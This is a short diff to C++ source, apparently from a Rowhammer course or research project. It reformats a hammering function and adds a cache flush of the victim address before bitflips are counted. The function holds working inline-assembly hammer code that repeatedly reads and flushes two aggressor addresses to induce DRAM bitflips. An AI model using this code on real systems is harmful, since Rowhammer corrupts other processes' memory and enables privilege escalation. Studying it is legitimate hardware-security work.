@@ -1,33 +1,34 @@
 #include "../shared.hh"
 #include "../params.hh"
+#include "../util.hh"
 
 uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
 
-  // prime
-  uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
-  memset(vict_virt_addr_ptr, 0xFF, PAGE_SIZE);
+    // prime
+    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
+    memset(vict_virt_addr_ptr, 0xFF, PAGE_SIZE);
   
-  int num_reads = HAMMERS_PER_ITER;
+    int num_reads = HAMMERS_PER_ITER;
 
-  while (num_reads-- > 0 ) {
-    asm volatile(
-      "mov (%0), %%rax\n\t"
-      "mov (%1), %%rax\n\t"
-      "clflush (%0)\n\t"
-      "clflush (%1)\n\t"
-      :
-      : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
-      : "rax"
-    );
-  }
-
-  uint32_t number_of_bitflips_in_target = 0;
-  for (uint32_t index = 0; index < PAGE_SIZE; index++) {
-      if (vict_virt_addr_ptr[index] != 0xFF) {
-        number_of_bitflips_in_target++;
-      }
-  }
-  return number_of_bitflips_in_target; 
+    while (num_reads-- > 0 ) {
+        asm volatile(
+            "mov (%0), %%rax\n\t"
+            "mov (%1), %%rax\n\t"
+            "clflush (%0)\n\t"
+            "clflush (%1)\n\t"
+            :
+            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
+            : "rax"
+        );
+    }
+    clflush(vict_virt_addr);
+    uint32_t number_of_bitflips_in_target = 0;
+    for (uint32_t index = 0; index < PAGE_SIZE; index++) {
+        if (vict_virt_addr_ptr[index] != 0xFF) {
+            number_of_bitflips_in_target++;
+        }
+    }
+    return number_of_bitflips_in_target; 
 }
 
 uint64_t get_dram_address(uint64_t row, int bank, uint64_t col) {
